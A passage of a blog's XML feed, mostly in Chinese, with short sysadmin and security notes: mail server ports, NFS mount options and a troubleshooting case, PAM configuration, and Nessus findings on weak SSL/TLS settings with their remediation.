class="hljs-number">5</span>AQ3OK71X1bmdBaZw<span class="hljs-operator">==</span><br><span class="hljs-params">Date:</span> Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">24</span>:<span class="hljs-number">59</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-params">To:</span> nc0isini@foxmail.com<br><span class="hljs-params">From:</span> hawk0@vict.site<br>Subject:test1<br><span class="hljs-params">Message-Id:</span> <span class="hljs-operator">&lt;</span><span class="hljs-number">20211102202459.1761162</span>@localhost.localdomain<span class="hljs-operator">&gt;</span><br><span class="hljs-params">X-Mailer:</span> swaks v20190914.<span class="hljs-number">0</span> jetmore.org<span class="hljs-operator">/</span>john<span class="hljs-operator">/</span>code<span class="hljs-operator">/</span>swaks<span class="hljs-symbol">/</span><br><br>This is a test mailing<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mailsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mailsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mail_base</title>
    <link href="/2024/05/16/security/itsec/mailsec/mail_base/"/>
    <url>/2024/05/16/security/itsec/mailsec/mail_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><h3 id="SMTP常见端口"><a href="#SMTP常见端口" class="headerlink" title="SMTP常见端口"></a>SMTP常见端口</h3><p>TCP 25端口</p><p>TCP 587端口，加密端口，STARTTLS协议，属于TLS通讯协议，在STARTTLS命令执行后对原文加密</p><p>TCP 465端口，加密端口，SMTPS（SMTP-over-SSL）</p><h3 id="POP3常见端口"><a href="#POP3常见端口" class="headerlink" title="POP3常见端口"></a>POP3常见端口</h3><p>TCP 110端口</p><p>TCP 995端口</p><h3 id="EXCHANGE常见端口"><a href="#EXCHANGE常见端口" class="headerlink" title="EXCHANGE常见端口"></a>EXCHANGE常见端口</h3><p>TCP 587端口</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mailsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mailsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mount</title>
    <link href="/2024/05/13/yunwei/yunweicommands/Linuxcommands/mount/"/>
    <url>/2024/05/13/yunwei/yunweicommands/Linuxcommands/mount/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>mount -t nfs -o vers&#x3D;3,timeo&#x3D;600,nolock,rsize&#x3D;1048576,wsize&#x3D;1048576,hard,retrans&#x3D;3,noresvport,async,noatime,nodiratime scan.security.nfs.cu-beijing-1-a.nas.aa.bb.com.cn:&#x2F;share .&#x2F;sfs</p><h4 id="t-fstype"><a href="#t-fstype" class="headerlink" title="-t fstype"></a>-t fstype</h4><p>指定文件系统类型</p><p>支持的文件系统类型可以查看 &#x2F;proc&#x2F;filesystems或 &#x2F;lib&#x2F;modules&#x2F;$(uname -r)&#x2F;kernel&#x2F;fs</p><p><strong>cat &#x2F;proc&#x2F;filesystems</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl">[root@nvm<span class="hljs-number">-9</span>bph6mpm2uq0 data0]# cat /<span class="hljs-keyword">proc</span>/filesystems<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>sysfs<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>tmpfs<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>bdev<span class="hljs-title"></span><br><span class="hljs-title">nodev</span><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">nodev</span>cgroup<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>cgroup2<br></code></pre></td></tr></table></figure><p><strong>ls &#x2F;lib&#x2F;modules&#x2F;$(uname -r)&#x2F;kernel&#x2F;fs</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[root@nvm<span class="hljs-number">-9</span>bph6mpm2uq0 data0]<span class="hljs-comment"># ls /lib/modules/$(uname -r)/kernel/fs</span><br>afs                <span class="hljs-keyword">cachefiles </span> cifs  exfat  fat      fuse  isofs  lockd          netfs  nfs_common  nls        pstore        squashfs  xfs<br><span class="hljs-keyword">binfmt_misc.ko.xz </span> ceph        dlm   <span class="hljs-keyword">ext4 </span>  fscache  gfs2  <span class="hljs-keyword">jbd2 </span>  mbcache.ko.xz  nfs    nfsd        overlayfs  smbfs_common  udf<br></code></pre></td></tr></table></figure><h4 id="o，–options-opts"><a href="#o，–options-opts" class="headerlink" title="-o，–options opts"></a>-o，–options opts</h4><p>指定特殊的选项</p><h5 id="async"><a href="#async" class="headerlink" title="async"></a>async</h5><p>I&#x2F;O 异步传输</p><h5 id="atime"><a href="#atime" class="headerlink" title="atime"></a>atime</h5><p>不使用noatime特性，因此inode访问时间由内核默认值控制</p><h5 id="noatime"><a href="#noatime" class="headerlink" title="noatime"></a>noatime</h5><p>不更新文件访问时间（access time）</p><h5 id="nodiratime"><a href="#nodiratime" class="headerlink" title="nodiratime"></a>nodiratime</h5><p>不更新目录访问时间（access time）</p><h5 id="diratime"><a href="#diratime" class="headerlink" title="diratime"></a>diratime</h5><p>更新目录访问时间，默认配置，如果设置noatime，该配置忽略</p><h5 id="nolock"><a href="#nolock" class="headerlink" title="nolock"></a>nolock</h5><h5 id="noresvport"><a href="#noresvport" class="headerlink" title="noresvport"></a>noresvport</h5><h5 id="vers"><a href="#vers" class="headerlink" title="vers"></a>vers</h5><h5 id="timeo"><a href="#timeo" class="headerlink" title="timeo"></a>timeo</h5><h5 id="rsize"><a href="#rsize" class="headerlink" title="rsize"></a>rsize</h5><p>设置读缓冲区字节大小</p><p>rsize&#x3D;1048576</p><h5 id="wsize"><a href="#wsize" class="headerlink" title="wsize"></a>wsize</h5><p>设置写缓冲区字节大小</p><p>wsize&#x3D;1048576</p><h5 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h5><h5 id="retrans"><a href="#retrans" class="headerlink" title="retrans"></a>retrans</h5><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><h3 id="nfs缺少帮助程序"><a href="#nfs缺少帮助程序" class="headerlink" title="nfs缺少帮助程序"></a>nfs缺少帮助程序</h3><h4 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h4><p>mount -t nfs -o async,noatime,nodiratime scan.nas.baidu.com:&#x2F;share .&#x2F;sfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount: /data0/sfs: bad option; <span class="hljs-keyword">for</span> several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&lt;<span class="hljs-built_in">type</span>&gt; helper program.<br></code></pre></td></tr></table></figure><h4 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h4><p>根据错误提示可知，缺乏&#x2F;sbin&#x2F;mount.nfs程序</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">root@nvm-9bph6mpm2uq0 data0</span>]<span class="hljs-meta"># /sbin/mount.nfs</span><br>bash: /sbin/mount.nfs: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory<br></code></pre></td></tr></table></figure><p>在其他服务器上查看存在该程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost /]# <span class="hljs-built_in">ls</span> /sbin/mount.nfs<br>/sbin/mount.nfs<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@nvm<span class="hljs-string">-9</span>bph6mpm2uq0 data0]# yum list | grep nfs<br>centos-release-nfs-ganesha4.noarch                   1.0<span class="hljs-string">-2</span>.el9                           extras<br>libnfsidmap.i686                                     1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>libnfsidmap.x86_64                                   1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>libstoragemgmt-nfs-plugin.x86_64                     1.9.7<span class="hljs-string">-2</span>.el9                         appstream<br>nfs-utils.x86_64                                     1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>nfs-utils-coreos.x86_64                              1:2.5.4<span class="hljs-string">-25</span>.el9                      appstream<br>nfs4-acl-tools.x86_64                                0.4.2<span class="hljs-string">-3</span>.el9                         baseos<br>nfsv4-client-utils.x86_64                            1:2.5.4<span class="hljs-string">-25</span>.el9                      appstream<br>pcp-pmda-nfsclient.x86_64                            6.2.0<span class="hljs-string">-2</span>.el9_4                       appstream<br>sssd-nfs-idmap.x86_64                                2.9.4<span class="hljs-string">-6</span>.el9_4                       baseos<br>texlive-mfnfss.noarch                                9:20200406<span class="hljs-string">-26</span>.el9_2                 appstream<br>texlive-psnfss.noarch                                9:20200406<span class="hljs-string">-26</span>.el9_2                 appstream<br></code></pre></td></tr></table></figure><p>解决方案</p><p>sudo yum install nfs-utils  </p><p>sudo dnf install nfs-utils</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@nvm-9bph6mpm2uq0 data0]# <span class="hljs-built_in">ls</span> /sbin/mount.nfs<br>/sbin/mount.nfs<br></code></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mount</span> -t nfs -o vers=<span class="hljs-number">3</span>,timeo=<span class="hljs-number">600</span>,nolock,rsize=<span class="hljs-number">1048576</span>,wsize=<span class="hljs-number">1048576</span>,hard,retrans=<span class="hljs-number">3</span>,noresvport,async,noatime,nodiratime nfs.domain:/share ./sfs<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nessus-中危-SSL 64-bit Block Size Cipher Suites Supported (SWEET32)</title>
    <link href="/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-SSL%2064-bit%20Block%20Size%20Cipher%20Suites%20Supported%20(SWEET32)/"/>
    <url>/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-SSL%2064-bit%20Block%20Size%20Cipher%20Suites%20Supported%20(SWEET32)/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞标题"><a href="#漏洞标题" class="headerlink" title="漏洞标题"></a>漏洞标题</h2><p>SSL 64-bit Block Size Cipher Suites Supported (SWEET32)</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>The remote host supports the use of a block cipher with 64-bit blocks in one or more cipher suites. It is, therefore, affected by a vulnerability, known as SWEET32, due to the use of weak 64-bit block ciphers. A man-in-the-middle attacker who has sufficient resources can exploit this vulnerability, via a ‘birthday’ attack, to detect a collision that leaks the XOR between the fixed secret and a known plaintext, allowing the disclosure of the secret text, such as secure HTTPS cookies, and possibly resulting in the hijacking of an authenticated session.</p><p>Proof-of-concepts have shown that attackers can recover authentication cookies from an HTTPS session in as little as 30 hours.</p><p>Note that the ability to send a large number of requests over the same TLS connection between the client and server is an important requirement for carrying out this attack. If the number of requests allowed for a single connection were limited, this would mitigate the vulnerability. This plugin requires report paranoia as Nessus has not checked for such a mitigation.</p><p>远程主机支持在一个或多个密码套件中使用64位分组密码。因此，由于使用了较弱的64位分组密码，它会受到名为SWEET32的漏洞的影响。有足够资源的中间人攻击者可以利用这个漏洞，通过“birthday”攻击来检测固定密钥和已知明文之间的异或冲突，从而允许密钥文本（如安全的HTTPS cookie）泄露，并可能导致对已认证会话的劫持。</p><p>概念验证表明，攻击者可以在30小时内从HTTPS会话中恢复身份验证cookie。</p><p>请注意，通过客户端和服务器之间的同一个TLS连接发送大量请求的能力是实施这种攻击的一个重要要求。如果限制单个连接允许的请求数量，则可以减轻该漏洞。这个插件需要报告偏执狂，因为Nessus没有检查这样的缓解。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Reconfigure the affected application, if possible, to avoid use of all 64-bit block ciphers. Alternatively, place limitations on the number of requests that are allowed to be processed over the same TLS connection to mitigate this vulnerability.</p><p>如果可能，请重新配置受影响的应用程序，以避免使用所有64位分组密码。或者，对同一个TLS连接上允许处理的请求数量进行限制，以缓解此漏洞。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nessus-严重-SSL Version 2 and 3 Protocol Detection</title>
    <link href="/2024/05/07/security/osSec/nessus-%E4%B8%A5%E9%87%8D-SSL%20Version%202%20and%203%20Protocol%20Detection/"/>
    <url>/2024/05/07/security/osSec/nessus-%E4%B8%A5%E9%87%8D-SSL%20Version%202%20and%203%20Protocol%20Detection/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞标题"><a href="#漏洞标题" class="headerlink" title="漏洞标题"></a>漏洞标题</h2><p>SSL Version 2 and  3 Protocol Detection</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>The  remote service accepts connections encrypted using SSL 2.0 and&#x2F;or     SSL 3.0. These versions of SSL are affected by several cryptographic     flaws, including:           - An insecure padding scheme with  CBC ciphers.           - Insecure session renegotiation  and resumption schemes.          An attacker can exploit these flaws to conduct man-in-the-middle     attacks or to decrypt communications between the affected service and     clients.          Although SSL&#x2F;TLS has a secure means for choosing the highest  supported     version of the protocol (so that these versions will be used only if     the client or server support nothing better), many web browsers     implement this in an unsafe way that allows an attacker to downgrade     a connection (such as in POODLE). Therefore, it is recommended that     these protocols be disabled entirely.          NIST has determined that SSL 3.0 is no longer acceptable for secure     communications. As of the date of enforcement found in PCI DSS v3.1,     any version of SSL will not meet the PCI SSC’s definition of ‘strong     cryptography’.</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Consult  the application’s documentation to disable SSL 2.0 and 3.0.     Use TLS 1.2 (with approved cipher suites) or higher instead.</p><p>修改配置文件，禁用SSL2.0和SSL3.0，使用TLS1.2或更高的版本</p><p>修改完成后需要重启服务使生效</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux_pam_auth</title>
    <link href="/2024/05/07/security/osSec/linux_pam_auth/"/>
    <url>/2024/05/07/security/osSec/linux_pam_auth/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="PAM简介"><a href="#PAM简介" class="headerlink" title="PAM简介"></a>PAM简介</h1><p>Pluggable Authentication Modules 可插拔式认证模块</p><p>提供对所有服务进行认证的中央机制</p><p>适用于：login、远程登录（telnet、login、fsh、ftp、ppp）、su等应用程序</p><p>由于是PAM为嵌入式，因此修改配置后会立刻生效</p><h1 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h1><p>认证顺序为 Service（服务）-&gt; PAM（配置文件）-&gt; 认证文件</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>目录：&#x2F;etc&#x2F;pam.d&#x2F;，可以通过配置文件来确认支持PAM认证的程序</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ pam.<span class="hljs-keyword">d</span>]# <span class="hljs-keyword">ls</span> /etc/pam.<span class="hljs-keyword">d</span>/<br>atd                  login             postlogin-<span class="hljs-keyword">ac</span>       smtp.postfix          system-auth<br>chfn                 other             remote             sshd                  system-auth-<span class="hljs-keyword">ac</span><br>chsh                 passwd            runuser            <span class="hljs-keyword">su</span>                    systemd-user<br>config-util          password-auth     runuser-<span class="hljs-keyword">l</span>          subscription-manager  vlock<br>crond                password-auth-<span class="hljs-keyword">ac</span>  smartcard-auth     sudo<br>fingerprint-auth     polkit-1          smartcard-auth-<span class="hljs-keyword">ac</span>  sudo-i<br>fingerprint-auth-<span class="hljs-keyword">ac</span>  postlogin         smtp               <span class="hljs-keyword">su</span>-<span class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure><p>配置文件中的每一行都是独立的认证过程，PAM模块自上到下的顺序调用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@iZbp1191gh7vw52537lyxrZ pam.d]# cat /etc/pam.d/su<br>#%PAM<span class="hljs-number">-1</span>twarden<span class="hljs-number">.0</span><br>authsufficientpam_rootok.so<br># Uncomment the <span class="hljs-keyword">following</span> <span class="hljs-type">line</span> <span class="hljs-keyword">to</span> implicitly trust users <span class="hljs-keyword">in</span> the &quot;wheel&quot; <span class="hljs-keyword">group</span>.<br><span class="hljs-meta">#authsufficientpam_wheel.so trust use_uid</span><br># Uncomment the <span class="hljs-keyword">following</span> <span class="hljs-type">line</span> <span class="hljs-keyword">to</span> require a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> be <span class="hljs-keyword">in</span> the &quot;wheel&quot; <span class="hljs-keyword">group</span>.<br><span class="hljs-meta">#authrequiredpam_wheel.so use_uid</span><br>authsubstack<span class="hljs-keyword">system</span>-auth<br>auth<span class="hljs-keyword">include</span>postlogin<br>accountsufficientpam_succeed_if.so uid = <span class="hljs-number">0</span> use_uid quiet<br>account<span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">password</span><span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">session</span><span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">session</span><span class="hljs-keyword">include</span>postlogin<br><span class="hljs-keyword">session</span>optionalpam_xauth.so<br></code></pre></td></tr></table></figure><p>第一列 - PAM认证模块类型</p><p>auth-对用户身份进行识别，例如提示输入密码，是否为root等</p><p>account-对账号各项属性进行检测，例如是否允许登录系统，账号是否过期等</p><p>password-使用用户信息来更新数据，例如修改密码</p><p>session-设置用户登录前以及退出后需要进行的会话操作管理，例如登录连接信息</p><p>第二列 - PAM控制标记</p><p>sufficient-该认证过程成功后表示该模块成功，将不再进行后续的认证。该认证过程失败，不影响后续认证</p><p>required-该认证过程必须成功后才表示该模块成功，如果该认证过程失败后，后续认证会继续进行，等到后续认证完成后返回失败</p><p>requisite-与required相似，只有该认证过程成功后才表示该模块成功，如果该认证过程失败，则会立刻返回该模块失败，控制权返回给应用程序</p><p>substack-表示</p><p>include-表示在验证过程中需要加载调用其他配置文件，例如很多应用都会调用&#x2F;etc&#x2F;pam.d&#x2F;system-auth（主要用于用户登录系统认证）</p><p>optional-不进行认证是否成功的验证，只显示信息，常用于session</p><p>第三列 - PAM模块</p><p>默认在&#x2F;lib64&#x2F;security或&#x2F;lib&#x2F;security目录，如果没有在这两个目录，需要写绝对路径</p><p>模块可以出现在多个配置文件中，也就是多个PAM认证中</p><p>第四列 - PAM模块参数</p><p>根据不同的模块设置，可以有多个参数，多个参数使用空格分隔</p><h2 id="认证文件"><a href="#认证文件" class="headerlink" title="认证文件"></a>认证文件</h2><p>目录：&#x2F;lib64&#x2F;security</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ security]# <span class="hljs-keyword">ls</span><br>pam_access.<span class="hljs-keyword">so</span>     pam_filter        pam_mkhomedir.<span class="hljs-keyword">so</span>       pam_selinux.<span class="hljs-keyword">so</span>     pam_unix_auth.<span class="hljs-keyword">so</span><br>pam_cap.<span class="hljs-keyword">so</span>        pam_filter.<span class="hljs-keyword">so</span>     pam_motd.<span class="hljs-keyword">so</span>            pam_sepermit.<span class="hljs-keyword">so</span>    pam_unix_passwd.<span class="hljs-keyword">so</span><br>pam_chroot.<span class="hljs-keyword">so</span>     pam_ftp.<span class="hljs-keyword">so</span>        pam_namespace.<span class="hljs-keyword">so</span>       pam_shells.<span class="hljs-keyword">so</span>      pam_unix_session.<span class="hljs-keyword">so</span><br>pam_console.<span class="hljs-keyword">so</span>    pam_group.<span class="hljs-keyword">so</span>      pam_nologin.<span class="hljs-keyword">so</span>         pam_stress.<span class="hljs-keyword">so</span>      pam_unix.<span class="hljs-keyword">so</span><br>pam_cracklib.<span class="hljs-keyword">so</span>   pam_issue.<span class="hljs-keyword">so</span>      pam_permit.<span class="hljs-keyword">so</span>          pam_succeed_if.<span class="hljs-keyword">so</span>  pam_userdb.<span class="hljs-keyword">so</span><br>pam_debug.<span class="hljs-keyword">so</span>      pam_keyinit.<span class="hljs-keyword">so</span>    pam_postgresok.<span class="hljs-keyword">so</span>      pam_systemd.<span class="hljs-keyword">so</span>     pam_warn.<span class="hljs-keyword">so</span><br>pam_deny.<span class="hljs-keyword">so</span>       pam_lastlog.<span class="hljs-keyword">so</span>    pam_pwhistory.<span class="hljs-keyword">so</span>       pam_tally2.<span class="hljs-keyword">so</span>      pam_wheel.<span class="hljs-keyword">so</span><br>pam_echo.<span class="hljs-keyword">so</span>       pam_limits.<span class="hljs-keyword">so</span>     pam_pwquality.<span class="hljs-keyword">so</span>       pam_time.<span class="hljs-keyword">so</span>        pam_xauth.<span class="hljs-keyword">so</span><br>pam_env.<span class="hljs-keyword">so</span>        pam_listfile.<span class="hljs-keyword">so</span>   pam_rhosts.<span class="hljs-keyword">so</span>          pam_timestamp.<span class="hljs-keyword">so</span><br>pam_exec.<span class="hljs-keyword">so</span>       pam_localuser.<span class="hljs-keyword">so</span>  pam_rootok.<span class="hljs-keyword">so</span>          pam_tty_audit.<span class="hljs-keyword">so</span><br>pam_faildelay.<span class="hljs-keyword">so</span>  pam_loginuid.<span class="hljs-keyword">so</span>   pam_securetty.<span class="hljs-keyword">so</span>       pam_umask.<span class="hljs-keyword">so</span><br>pam_faillock.<span class="hljs-keyword">so</span>   pam_mail.<span class="hljs-keyword">so</span>       pam_selinux_permit.<span class="hljs-keyword">so</span>  pam_unix_acct.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure><p>也就是说用户访问服务器的某个服务，对应的服务器程序将用户请求发送到PAM模块进行认证，先判断具体的服务，再加载相应的PAM配置文件，最后通过认证文件进行认证</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]  系统安全及应用(su命令切换用户、PAM认证、sudo授权等) waldosia 2021-11-29 19:03:43</p><p><a href="https://blog.51cto.com/u_15386194/4715298">https://blog.51cto.com/u_15386194/4715298</a></p><p>[2] Linux配置允许普通用户免密码切换其他普通用户 chyuhung 2021-07-29 15:23</p><p><a href="https://www.cnblogs.com/chyuhung/p/15075280.html">https://www.cnblogs.com/chyuhung/p/15075280.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>system_security_hardening</title>
    <link href="/2024/05/07/security/osSec/system_security_hardening/"/>
    <url>/2024/05/07/security/osSec/system_security_hardening/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nessus-中危-TLS Version 1.0 Protocol Detection</title>
    <link href="/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-TLS%20Version%201.0%20Protocol%20Detection/"/>
    <url>/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-TLS%20Version%201.0%20Protocol%20Detection/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞标题"><a href="#漏洞标题" class="headerlink" title="漏洞标题"></a>漏洞标题</h2><p>TLS Version 1.0 Protocol Detection</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>The  remote service accepts connections encrypted using TLS 1.0. TLS 1.0 has  a     number of cryptographic design flaws. Modern implementations of TLS  1.0     mitigate these problems, but newer versions of TLS like 1.2 and 1.3  are     designed against these flaws and should be used whenever possible.          As of March 31, 2020, Endpoints that aren鈥檛 enabled for TLS 1.2     and higher will no longer function properly with major web browsers and  major vendors.          PCI DSS v3.2 requires that TLS 1.0 be disabled entirely by June 30,     2018, except for POS POI terminals (and the SSL&#x2F;TLS termination     points to which they connect) that can be verified as not being     susceptible to any known exploits.</p><p>The remote service encrypts traffic using an older version of TLS.</p><p>远程服务使用旧版本的TLS对流量进行加密。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Enable support for  TLS 1.2 and 1.3, and disable support for TLS 1.0..</p><p>启用对TLS 1.2和1.3的支持，并禁用对TLS 1.0的支持</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nessus-中危-SSL Medium Strength Cipher Suites Supported</title>
    <link href="/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-SSL%20Medium%20Strength%20Cipher%20Suites%20Supported/"/>
    <url>/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-SSL%20Medium%20Strength%20Cipher%20Suites%20Supported/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞标题"><a href="#漏洞标题" class="headerlink" title="漏洞标题"></a>漏洞标题</h2><p>SSL Medium Strength Cipher Suites Supported (SWEET32)</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>The remote host supports the use of SSL ciphers that offer medium strength encryption. Nessus regards medium strength as any encryption that uses key lengths at least 64 bits and less than 112 bits, or else that uses the 3DES encryption suite.</p><p>Note that it is considerably easier to circumvent medium strength encryption if the attacker is on the same physical network.</p><p>远程主机支持使用提供中等强度加密的SSL密码。Nessus将中等强度视为密钥长度至少64位且小于112位的任何加密，或者使用3DES加密套件。</p><p>请注意，如果攻击者在同一个物理网络上，那么绕过中等强度加密就容易得多。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Reconfigure the affected application if possible to avoid use of medium strength ciphers.</p><p>如果可能，请重新配置受影响的应用程序，以避免使用中等强度的密码。</p><p>删除所有CBC密码套件</p><p><a href="https://blog.csdn.net/Yang_RR/article/details/138616193">https://blog.csdn.net/Yang_RR/article/details/138616193</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yum</title>
    <link href="/2024/04/17/yunwei/yunweicommands/Linuxcommands/yum/"/>
    <url>/2024/04/17/yunwei/yunweicommands/Linuxcommands/yum/</url>
    
